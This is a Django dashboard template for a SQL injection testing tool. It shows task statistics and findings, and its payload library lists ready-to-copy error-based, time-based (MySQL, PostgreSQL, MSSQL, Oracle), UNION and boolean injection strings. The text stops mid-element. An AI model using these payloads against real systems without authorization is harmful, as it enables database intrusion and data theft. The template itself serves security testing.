{% extends "base.html" %}
{% load static %}

{% block title %}SQL Injection Attacker - Dashboard{% endblock %}

{% block content %}
<div class="max-w-7xl mx-auto space-y-6">
    <!-- Breadcrumb -->
    <nav class="flex items-center space-x-2 text-sm text-gray-600 dark:text-gray-400">
        <a href="/" class="hover:text-primary-600 dark:hover:text-primary-400">Megido Security</a>
        <span>/</span>
        <span class="text-gray-900 dark:text-white font-medium">SQL Attacker</span>
        <span>/</span>
        <span class="text-gray-900 dark:text-white font-medium">Dashboard</span>
    </nav>

    <!-- Hero Section -->
    <div class="card">
        <div class="card-body text-center">
            <h1 class="text-3xl font-bold text-gray-900 dark:text-white mb-2">üõ°Ô∏è SQL Injection Attacker Dashboard</h1>
            <p class="text-gray-600 dark:text-gray-400">Modern security testing platform with integrated payload library</p>
        </div>
    </div>

    <!-- Quick Stats Cards -->
    <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
        <div class="card bg-gradient-to-br from-primary-500 to-primary-600 text-white">
            <div class="card-body text-center">
                <div class="text-3xl mb-2">üìã</div>
                <div class="text-sm opacity-90">Total Tasks</div>
                <div class="text-2xl font-bold">{{ total_tasks }}</div>
            </div>
        </div>
        <div class="card bg-gradient-to-br from-yellow-500 to-yellow-600 text-white">
            <div class="card-body text-center">
                <div class="text-3xl mb-2">‚è≥</div>
                <div class="text-sm opacity-90">Pending</div>
                <div class="text-2xl font-bold">{{ pending_tasks }}</div>
            </div>
        </div>
        <div class="card bg-gradient-to-br from-blue-500 to-blue-600 text-white">
            <div class="card-body text-center">
                <div class="text-3xl mb-2">‚ö°</div>
                <div class="text-sm opacity-90">Running</div>
                <div class="text-2xl font-bold">{{ running_tasks }}</div>
            </div>
        </div>
        <div class="card bg-gradient-to-br from-green-500 to-green-600 text-white">
            <div class="card-body text-center">
                <div class="text-3xl mb-2">‚úÖ</div>
                <div class="text-sm opacity-90">Completed</div>
                <div class="text-2xl font-bold">{{ completed_tasks }}</div>
            </div>
        </div>
        <div class="card bg-gradient-to-br from-red-500 to-red-600 text-white">
            <div class="card-body text-center">
                <div class="text-3xl mb-2">‚ö†Ô∏è</div>
                <div class="text-sm opacity-90">Failed</div>
                <div class="text-2xl font-bold">{{ failed_tasks }}</div>
            </div>
        </div>
        <div class="card bg-gradient-to-br from-gray-700 to-gray-800 text-white">
            <div class="card-body text-center">
                <div class="text-3xl mb-2">üêõ</div>
                <div class="text-sm opacity-90">Vulnerabilities</div>
                <div class="text-2xl font-bold">{{ total_vulns }}</div>
            </div>
        </div>
    </div>

    <!-- Quick Action Buttons -->
    <div class="flex flex-wrap gap-3">
        <a href="{% url 'sql_attacker:task_create' %}" class="btn btn-primary">
            ‚ûï Create New Attack
        </a>
        <a href="{% url 'sql_attacker:task_list' %}" class="btn btn-secondary">
            üìã View All Tasks
        </a>
        <button class="btn btn-info" onclick="document.querySelector('[data-tab-target=\'payload-library\']').click()">
            üíª Payload Library
        </button>
    </div>
    
    <!-- Tabbed Interface -->
    <div class="card">
        <div class="border-b border-gray-200 dark:border-gray-700">
            <nav class="flex space-x-1 px-4" role="tablist">
                <button class="tab-link active" data-tab-target="overview">
                    üìä Overview
                </button>
                <button class="tab-link" data-tab-target="recent-tasks">
                    üìã Recent Tasks
                </button>
                <button class="tab-link" data-tab-target="payload-library">
                    üíª Payload Library
                </button>
                <button class="tab-link" data-tab-target="recent-findings">
                    üêõ Recent Findings
                </button>
                <button class="tab-link" data-tab-target="multi-context-results">
                    üéØ Multi-Context Results
                </button>
            </nav>
        </div>

        <!-- Tab Contents -->
        <div class="card-body">
            <div class="tab-content" id="overview">
                {% if injection_stats %}
                <div class="space-y-6">
                    <div>
                        <h5 class="text-lg font-semibold text-gray-900 dark:text-white mb-4">üìä Vulnerabilities by Injection Type</h5>
                        <div class="table-container">
                            <table class="table">
                                <thead>
                                    <tr>
                                        <th>üè∑Ô∏è Injection Type</th>
                                        <th># Count</th>
                                        <th>üìà Percentage</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    {% for stat in injection_stats %}
                                    <tr>
                                        <td>{{ stat.injection_type|title }}</td>
                                        <td><span class="badge badge-danger">{{ stat.count }}</span></td>
                                        <td>{% widthratio stat.count total_vulns 100 %}%</td>
                                    </tr>
                                    {% endfor %}
                                </tbody>
                            </table>
                        </div>
                    </div>
                {% else %}
                <div class="text-center py-12">
                    <div class="text-6xl mb-4">üìä</div>
                    <h4 class="text-xl font-semibold text-gray-900 dark:text-white mb-2">No Statistics Available</h4>
                    <p class="text-gray-600 dark:text-gray-400">Start testing to see vulnerability statistics</p>
                </div>
                {% endif %}
                
                <div class="mt-6">
                    <h5 class="text-lg font-semibold text-gray-900 dark:text-white mb-4">‚ÑπÔ∏è Quick Start Guide</h5>
                    <ol class="space-y-2 text-gray-700 dark:text-gray-300">
                        <li><strong>Create a Task:</strong> Click "Create New Attack" to set up a SQL injection test</li>
                        <li><strong>Configure Target:</strong> Enter the target URL and parameters to test</li>
                        <li><strong>Select Attack Types:</strong> Choose error-based, time-based, or both</li>
                        <li><strong>Execute:</strong> Run the attack and monitor progress</li>
                        <li><strong>Review Results:</strong> Check findings in the Recent Findings tab</li>
                        <li><strong>Use Payloads:</strong> Browse the Payload Library for manual testing</li>
                    </ol>
                </div>
                </div>
            </div>

            <div class="tab-content hidden" id="recent-tasks">
                <div class="space-y-4">
                    <h5 class="text-lg font-semibold text-gray-900 dark:text-white">üìã Recent Attack Tasks</h5>
                    {% if tasks %}
                    <div class="table-container">
                        <table class="table">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>Target URL</th>
                                    <th>Method</th>
                                    <th>Status</th>
                                    <th>Vulnerabilities</th>
                                    <th>Created</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for task in tasks %}
                                <tr>
                                    <td><strong>#{{ task.id }}</strong></td>
                                    <td>
                                        <a href="{% url 'sql_attacker:task_detail' task.id %}" class="text-primary-600 dark:text-primary-400 hover:underline">
                                            {{ task.target_url|truncatechars:60 }}
                                        </a>
                                    </td>
                                    <td><span class="badge badge-info">{{ task.http_method }}</span></td>
                                    <td>
                                        {% if task.status == 'completed' %}
                                        <span class="badge badge-success">
                                            ‚úì Completed
                                        </span>
                                        {% elif task.status == 'running' %}
                                        <span class="badge badge-info">
                                            ‚ö° Running
                                        </span>
                                        {% elif task.status == 'failed' %}
                                        <span class="badge badge-danger">
                                            ‚úó Failed
                                        </span>
                                        {% else %}
                                        <span class="badge badge-warning">
                                            ‚è≥ Pending
                                        </span>
                                        {% endif %}
                                    </td>
                                    <td>
                                        {% if task.vulnerabilities_found > 0 %}
                                        <span class="badge badge-danger">
                                            üêõ {{ task.vulnerabilities_found }}
                                        </span>
                                        {% else %}
                                        <span class="badge badge-secondary">
                                            üõ°Ô∏è 0
                                        </span>
                                        {% endif %}
                                    </td>
                                    <td class="text-sm">{{ task.created_at|date:"Y-m-d H:i" }}</td>
                                    <td>
                                        <a href="{% url 'sql_attacker:task_detail' task.id %}" class="btn btn-sm btn-primary">
                                            üëÅÔ∏è View
                                        </a>
                                    </td>
                                </tr>
                                {% endfor %}
                            </tbody>
                        </table>
                    </div>
                    {% else %}
                    <div class="text-center py-12">
                        <div class="text-6xl mb-4">üìã</div>
                        <h4 class="text-xl font-semibold text-gray-900 dark:text-white mb-2">No Tasks Yet</h4>
                        <p class="text-gray-600 dark:text-gray-400 mb-4">Create your first attack task to get started!</p>
                        <a href="{% url 'sql_attacker:task_create' %}" class="btn btn-primary">
                            ‚ûï Create Task
                        </a>
                    </div>
                    {% endif %}
                </div>
            </div>

            <div class="tab-content hidden" id="payload-library">
                <div class="space-y-6">
                    <h3 class="text-xl font-bold text-gray-900 dark:text-white">üìñ SQL Injection Payload Library</h3>
                    
                    <!-- Search Box -->
                    <div class="space-y-2">
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 flex items-center pl-3 text-gray-500">
                                üîç
                            </span>
                            <input type="text" id="payloadSearch" placeholder="Search payloads... (Ctrl+K)" 
                                   class="form-input pl-10">
                        </div>
                        <p class="text-sm text-gray-600 dark:text-gray-400">
                            ‚ÑπÔ∏è Tip: Search by payload text, category (error, time, union, boolean), or database (mysql, postgresql, mssql, oracle)
                        </p>
                    </div>
                    
                    <!-- Error-Based Payloads -->
                    <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors" 
                                aria-expanded="true" 
                                aria-controls="error-based-payloads">
                            <h4 class="text-lg font-semibold text-gray-900 dark:text-white">‚ö†Ô∏è Error-Based SQL Injection</h4>
                            <span class="collapse-icon text-gray-500">‚ñº</span>
                        </button>
                        <div id="error-based-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                            {% for payload in "' OR '1'='1|' OR '1'='1'--|' OR '1'='1' /*|\" OR \"1\"=\"1|\", OR \"1\"=\"1\"--|') OR ('1'='1|\") OR (\"1\"=\"1|' AND '1'='2|admin'--|admin' #|admin'/*|' OR 'x'='x|') OR ('x')=('x|1' AND '1'='1|1' AND '1'='2|' UNION SELECT NULL--|' UNION SELECT NULL,NULL--|' UNION SELECT NULL,NULL,NULL--"%}
                            <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
                                <div class="flex items-center gap-2">
                                    <span class="badge badge-danger text-xs">Error-Based</span>
                                    <span class="badge badge-secondary text-xs">All DBs</span>
                                    <button class="btn btn-sm btn-secondary" onclick="copyToClipboard('{{ payload }}', this)" 
                                            title="Copy to clipboard">
                                        üìã Copy
                                    </button>
                                </div>
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                    
                    <!-- Time-Based MySQL -->
                    <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
                                aria-expanded="true"
                                aria-controls="time-mysql-payloads">
                            <h4 class="text-lg font-semibold text-gray-900 dark:text-white">‚è∞ Time-Based SQL Injection - MySQL</h4>
                            <span class="collapse-icon text-gray-500">‚ñº</span>
                        </button>
                        <div id="time-mysql-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                            {% for payload in "' AND SLEEP(5)--|1' AND SLEEP(5)--|' OR SLEEP(5)--|1 AND SLEEP(5)|') AND SLEEP(5)--|' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"%}
                            <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
                                <div class="flex items-center gap-2">
                                    <span class="badge badge-warning text-xs">Time-Based</span>
                                    <span class="badge badge-info text-xs">MySQL</span>
                                    <button class="btn btn-sm btn-secondary" onclick="copyToClipboard('{{ payload }}', this)"
                                            title="Copy to clipboard">
                                        üìã Copy
                                    </button>
                                </div>
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                    
                    <!-- Time-Based PostgreSQL -->
                    <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
                                aria-expanded="true"
                                aria-controls="time-postgresql-payloads">
                            <h4 class="text-lg font-semibold text-gray-900 dark:text-white">‚è∞ Time-Based SQL Injection - PostgreSQL</h4>
                            <span class="collapse-icon text-gray-500">‚ñº</span>
                        </button>
                        <div id="time-postgresql-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                            {% for payload in "' AND pg_sleep(5)--|1' AND pg_sleep(5)--|' OR pg_sleep(5)--|') AND pg_sleep(5)--"%}
                            <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
                                <div class="flex items-center gap-2">
                                    <span class="badge badge-warning text-xs">Time-Based</span>
                                    <span class="badge badge-info text-xs">PostgreSQL</span>
                                    <button class="btn btn-sm btn-secondary" onclick="copyToClipboard('{{ payload }}', this)"
                                            title="Copy to clipboard">
                                        üìã Copy
                                    </button>
                                </div>
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                    
                    <!-- Time-Based MSSQL -->
                    <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
                                aria-expanded="true"
                                aria-controls="time-mssql-payloads">
                            <h4 class="text-lg font-semibold text-gray-900 dark:text-white">‚è∞ Time-Based SQL Injection - MSSQL</h4>
                            <span class="collapse-icon text-gray-500">‚ñº</span>
                        </button>
                        <div id="time-mssql-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                            {% for payload in "'; WAITFOR DELAY '00:00:05'--|1'; WAITFOR DELAY '00:00:05'--|' WAITFOR DELAY '00:00:05'--|') WAITFOR DELAY '00:00:05'--"%}
                            <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
                                <div class="flex items-center gap-2">
                                    <span class="badge badge-warning text-xs">Time-Based</span>
                                    <span class="badge badge-info text-xs">MSSQL</span>
                                    <button class="btn btn-sm btn-secondary" onclick="copyToClipboard('{{ payload }}', this)"
                                            title="Copy to clipboard">
                                        üìã Copy
                                    </button>
                                </div>
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                    
                    <!-- Time-Based Oracle -->
                    <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
                                aria-expanded="true"
                                aria-controls="time-oracle-payloads">
                            <h4 class="text-lg font-semibold text-gray-900 dark:text-white">‚è∞ Time-Based SQL Injection - Oracle</h4>
                            <span class="collapse-icon text-gray-500">‚ñº</span>
                        </button>
                        <div id="time-oracle-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                            {% for payload in "' AND DBMS_LOCK.SLEEP(5)--|1' AND DBMS_LOCK.SLEEP(5)--|') AND DBMS_LOCK.SLEEP(5)--"%}
                            <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
                                <div class="flex items-center gap-2">
                                    <span class="badge badge-warning text-xs">Time-Based</span>
                                    <span class="badge badge-info text-xs">Oracle</span>
                                    <button class="btn btn-sm btn-secondary" onclick="copyToClipboard('{{ payload }}', this)"
                                            title="Copy to clipboard">
                                        üìã Copy
                                    </button>
                                </div>
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                    
                    <!-- Union-Based Payloads -->
                    <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
                                aria-expanded="true"
                                aria-controls="union-payloads">
                            <h4 class="text-lg font-semibold text-gray-900 dark:text-white">üîó Union-Based SQL Injection</h4>
                            <span class="collapse-icon text-gray-500">‚ñº</span>
                        </button>
                        <div id="union-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                            {% for payload in "' UNION SELECT NULL--|' UNION SELECT NULL,NULL--|' UNION SELECT NULL,NULL,NULL--|' UNION SELECT NULL,NULL,NULL,NULL--|' UNION ALL SELECT NULL--|' UNION ALL SELECT NULL,NULL--|' ORDER BY 1--|' ORDER BY 2--|' ORDER BY 3--|' ORDER BY 10--|' UNION SELECT @@version--|' UNION SELECT database()--|' UNION SELECT user()--"%}
                            <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
                                <div class="flex items-center gap-2">
                                    <span class="badge badge-primary text-xs">Union</span>
                                    <span class="badge badge-secondary text-xs">All DBs</span>
                                    <button class="btn btn-sm btn-secondary" onclick="copyToClipboard('{{ payload }}', this)"
                                            title="Copy to clipboard">
                                        üìã Copy
                                    </button>
                                </div>
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                    
                    <!-- Boolean-Based Payloads -->
                    <div class="border border-gray-200 dark:border-gray-700 rounded-lg overflow-hidden">
                        <button class="payload-category-header w-full px-4 py-3 bg-gray-50 dark:bg-gray-800 flex justify-between items-center hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors"
                                aria-expanded="true"
                                aria-controls="boolean-payloads">
                            <h4 class="text-lg font-semibold text-gray-900 dark:text-white">üîò Boolean-Based SQL Injection</h4>
                            <span class="collapse-icon text-gray-500">‚ñº</span>
                        </button>
                        <div id="boolean-payloads" class="payload-category-content p-4 space-y-2 bg-white dark:bg-gray-900">
                            {% for payload in "' AND '1'='1|' AND '1'='2|' AND 'a'='a|' AND 'a'='b|1' AND '1'='1|1' AND '1'='2|') AND ('1'='1|') AND ('1'='2"%}
                            <div class="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-800 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors">
                                <code class="flex-1 text-sm text-gray-800 dark:text-gray-200 font-mono">{{ payload }}</code>
                                <div class="flex items-center gap-2">
                                    <span class="badge badge-success text-xs">Boolean</span>
                                    <span class="badge badge-secondary text-xs">All DBs</span>
                                    <button class="btn btn-sm btn-secondary" onclick="copyToClipboard('{{ payload }}', this)"
                                            title="Copy to clipboard">
                                        üìã Copy
                                    </button>
                                </div>
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                </div>
            </div>

            <div class="tab-content hidden" id="recent-findings">
                <div class="space-y-4">
                    <h5 class="text-lg font-semibold text-gray-900 dark:text-white">üêõ Recent Vulnerability Findings</h5>
                    {% if recent_results %}
                    <div class="table-container">
                        <table class="table">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>Task</th>
                                    <th>Injection Type</th>
                                    <th>Parameter</th>
                                    <th>Database</th>
                                    <th>Exploitable</th>
                                    <th>Detected</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for result in recent_results %}
                                <tr>
                                    <td><strong>#{{ result.id }}</strong></td>
                                    <td>
                                        <a href="{% url 'sql_attacker:task_detail' result.task.id %}" 
                                           class="text-primary-600 dark:text-primary-400 hover:underline">
                                            Task #{{ result.task.id }}
                                        </a>
                                    </td>
                                    <td>
                                        <span class="badge badge-danger">
                                            {{ result.get_injection_type_display }}
                                        </span>
                                    </td>
                                    <td><code class="text-sm">{{ result.vulnerable_parameter }}</code></td>
                                    <td>
                                        <span class="badge badge-info">
                                            {{ result.database_type|upper }}
                                        </span>
                                    </td>
                                    <td>
                                        {% if result.is_exploitable %}
                                        <span class="badge badge-danger">
                                            üí£ Yes
                                        </span>
                                        {% else %}
                                        <span class="badge badge-secondary">
                                            üõ°Ô∏è No
                                        </span>
                                        {% endif %}
                                    </td>
                                    <td class="text-sm">{{ result.detected_at|date:"Y-m-d H:i" }}</td>
                                    <td>
                                        <div class="flex gap-2">
                                            <a href="{% url 'sql_attacker:result_detail' result.id %}" 
                                               class="btn btn-sm btn-primary">
                                                üëÅÔ∏è View
                                            </a>
                                            <button class="btn btn-sm btn-secondary" 
                                                    onclick="copyToClipboard('{{ result.test_payload }}', this)"
                                                    title="Copy payload">
                                                üìã
                                            </button>
                                        </div>
                                    </td>
                                </tr>
                                {% endfor %}
                            </tbody>
                        </table>
                    </div>
                    {% else %}
                    <div class="text-center py-12">
                        <div class="text-6xl mb-4">üõ°Ô∏è</div>
                        <h4 class="text-xl font-semibold text-gray-900 dark:text-white mb-2">No Vulnerabilities Found Yet</h4>
                        <p class="text-gray-600 dark:text-gray-400">Run attack tasks to discover vulnerabilities</p>
                    </div>
                    {% endif %}
                </div>
            </div>
            
            <!-- Multi-Context Results Tab -->
            <div class="tab-content hidden" id="multi-context-results">
                <div class="space-y-6">
                    <div class="flex items-center justify-between">
                        <h5 class="text-lg font-semibold text-gray-900 dark:text-white">üéØ Multi-Context Injection Results</h5>
                        <div class="flex gap-2">
                            <button class="btn btn-sm btn-secondary" onclick="filterByContext('all')">All</button>
                            <button class="btn btn-sm btn-info" onclick="filterByContext('sql')">SQL</button>
                            <button class="btn btn-sm btn-info" onclick="filterByContext('ldap')">LDAP</button>
                            <button class="btn btn-sm btn-info" onclick="filterByContext('xpath')">XPath</button>
                            <button class="btn btn-sm btn-info" onclick="filterByContext('message_queue')">MQ</button>
                            <button class="btn btn-sm btn-info" onclick="filterByContext('custom_query')">Custom</button>
                        </div>
                    </div>
                    
                    {% if recent_results %}
                    <div id="multi-context-results-container" class="space-y-4">
                        {% for result in recent_results %}
                        <div class="card border-l-4 {% if result.verified %}border-green-500{% else %}border-yellow-500{% endif %} context-result" data-context="{{ result.injection_context }}">
                            <div class="card-body">
                                <!-- Header -->
                                <div class="flex items-start justify-between mb-4">
                                    <div class="flex-1">
                                        <div class="flex items-center gap-3 mb-2">
                                            <h4 class="text-lg font-semibold text-gray-900 dark:text-white">
                                                {% if result.injection_context == 'sql' %}
                                                    üíæ SQL Injection
                                                {% elif result.injection_context == 'ldap' %}
                                                    üìÅ LDAP Injection
                                                {% elif result.injection_context == 'xpath' %}
                                                    üìÑ XPath Injection
                                                {% elif result.injection_context == 'message_queue' %}
                                                    üì® Message Queue Injection
                                                {% elif result.injection_context == 'custom_query' %}
                                                    üîß Custom Query Injection
                                                {% else %}
                                                    üéØ {{ result.get_injection_context_display }}
                                                {% endif %}
                                            </h4>
                                            <span class="badge {% if result.verified %}badge-success{% else %}badge-warning{% endif %}">
                                                {% if result.verified %}‚úì Verified{% else %}‚ö† Detected{% endif %}
                                            </span>
                                            <span class="badge badge-{% if result.severity == 'critical' %}danger{% elif result.severity == 'high' %}warning{% elif result.severity == 'medium' %}info{% else %}secondary{% endif %}">
                                                {{ result.severity|upper }}
                                            </span>
                                        </div>
                                        <div class="text-sm text-gray-600 dark:text-gray-400">
                                            <strong>Parameter:</strong> <code class="px-2 py-1 bg-gray-100 dark:bg-gray-800 rounded">{{ result.vulnerable_parameter }}</code>
                                            <strong class="ml-4">Type:</strong> <span class="badge badge-info">{{ result.parameter_type }}</span>
                                            <strong class="ml-4">Task:</strong> <a href="{% url 'sql_attacker:task_detail' result.task.id %}" class="text-primary-600 dark:text-primary-400 hover:underline">#{{ result.task.id }}</a>
                                        </div>
                                    </div>
                                    <div class="text-right">
                                        <div class="text-sm text-gray-500 dark:text-gray-400">
                                            {{ result.detected_at|date:"Y-m-d H:i:s" }}
                                        </div>
                                        <div class="mt-1">
                                            <span class="text-xs font-semibold text-gray-700 dark:text-gray-300">
                                                Confidence: {{ result.confidence_score|floatformat:0 }}%
                                            </span>
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- Attack Vector & Payload -->
                                <div class="mb-4">
                                    <div class="flex items-start gap-2 mb-2">
                                        <span class="text-gray-700 dark:text-gray-300 font-semibold whitespace-nowrap">üéØ Attack Vector:</span>
                                        <div class="flex-1">
                                            <div class="text-gray-600 dark:text-gray-400">{{ result.attack_vector.description|default:"Injection attack" }}</div>
                                        </div>
                                    </div>
                                    <div class="flex items-start gap-2">
                                        <span class="text-gray-700 dark:text-gray-300 font-semibold whitespace-nowrap">üíâ Payload:</span>
                                        <div class="flex-1">
                                            <code class="block px-3 py-2 bg-gray-50 dark:bg-gray-800 rounded text-sm overflow-x-auto">{{ result.test_payload }}</code>
                                        </div>
                                        <button class="btn btn-sm btn-secondary" onclick="copyToClipboard('{{ result.test_payload|escapejs }}', this)" title="Copy payload">
                                            üìã Copy
                                        </button>
                                    </div>
                                </div>
                                
                                <!-- Evidence Panel -->
                                {% if result.detection_evidence %}
                                <div class="mb-4 p-4 {% if result.verified %}bg-green-50 dark:bg-green-900/20 border-l-4 border-green-500{% else %}bg-yellow-50 dark:bg-yellow-900/20 border-l-4 border-yellow-500{% endif %} rounded">
                                    <div class="flex items-start gap-2">
                                        <svg class="w-5 h-5 {% if result.verified %}text-green-600 dark:text-green-400{% else %}text-yellow-600 dark:text-yellow-400{% endif %} mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                                            {% if result.verified %}
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
                                            {% else %}
                                            <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
                                            {% endif %}
                                        </svg>
                                        <div class="flex-1">
                                            <strong class="{% if result.verified %}text-green-800 dark:text-green-300{% else %}text-yellow-800 dark:text-yellow-300{% endif %}">
                                                {% if result.verified %}‚úì Verified Evidence{% else %}‚ö† Detection Evidence{% endif %}
                                            </strong>
                                            <pre class="mt-2 text-xs {% if result.verified %}text-green-700 dark:text-green-400{% else %}text-yellow-700 dark:text-yellow-400{% endif %} whitespace-pre-wrap">{{ result.detection_evidence }}</pre>
                                        </div>
                                    </div>
                                </div>
                                {% endif %}
                                
                                <!-- Proof of Impact -->
                                {% if result.proof_of_impact %}
                                <div class="mb-4 p-4 bg-purple-50 dark:bg-purple-900/20 border-l-4 border-purple-500 rounded">
                                    <div class="flex items-start gap-2">
                                        <svg class="w-5 h-5 text-purple-600 dark:text-purple-400 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path>
                                        </svg>
                                        <div class="flex-1">
                                            <strong class="text-purple-800 dark:text-purple-300">üí• Proof of Impact</strong>
                                            <pre class="mt-2 text-xs text-purple-700 dark:text-purple-400 whitespace-pre-wrap">{{ result.proof_of_impact }}</pre>
                                        </div>
                                    </div>
                                </div>
                                {% endif %}
                                
                                <!-- Visual Proof Panel (following scanner pattern) -->
                                {% if result.visual_proof_path %}
                                <div class="mt-3 p-4 bg-purple-50 dark:bg-purple-900/20 border-l-4 border-purple-500 rounded">
                                    <div class="flex items-start gap-2">
                                        <svg class="w-5 h-5 text-purple-600 dark:text-purple-400 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                                            <path fill-rule="evenodd" d="M4 3a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V5a2 2 0 00-2-2H4zm12 12H4l4-8 3 6 2-4 3 6z" clip-rule="evenodd"></path>
                                        </svg>
                                        <div class="flex-1">
                                            <strong class="text-purple-800 dark:text-purple-300">üì∏ Visual Proof of Exploitation</strong>
                                            <div class="mt-2 text-xs text-purple-700 dark:text-purple-400">
                                                Type: <span class="font-semibold">{{ result.visual_proof_type|default:"screenshot" }}</span> ‚Ä¢ 
                                                Size: <span class="font-semibold">{{ result.visual_proof_size|filesizeformat }}</span>
                                            </div>
                                            <div class="mt-3 cursor-pointer" onclick="showVisualProof('{{ result.visual_proof_path }}', '{{ result.visual_proof_type }}', {{ result.id }})">
                                                {% if result.visual_proof_type == 'gif' %}
                                                    <img src="/{{ result.visual_proof_path }}" 
                                                         alt="Exploitation proof GIF" 
                                                         class="rounded border-2 border-purple-300 dark:border-purple-600 hover:border-purple-500 transition-all max-w-full h-auto shadow-lg"
                                                         style="max-height: 400px;">
                                                    <div class="text-xs text-purple-600 dark:text-purple-400 mt-2 text-center">
                                                        üé¨ Click to view in fullscreen
                                                    </div>
                                                {% else %}
                                                    <img src="/{{ result.visual_proof_path }}" 
                                                         alt="Exploitation proof screenshot" 
                                                         class="rounded border-2 border-purple-300 dark:border-purple-600 hover:border-purple-500 transition-all max-w-full h-auto shadow-lg"
                                                         style="max-height: 400px;">
                                                    <div class="text-xs text-purple-600 dark:text-purple-400 mt-2 text-center">
                                                        üîç Click to view in fullscreen
                                                    </div>
                                                {% endif %}
                                            </div>
                                            <div class="mt-2">
                                                <a href="/{{ result.visual_proof_path }}" 
                                                   download 
                                                   class="inline-flex items-center px-3 py-1 text-xs font-medium rounded-md text-purple-700 bg-purple-100 hover:bg-purple-200 dark:bg-purple-800 dark:text-purple-200 dark:hover:bg-purple-700 transition-colors">
                                                    <svg class="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
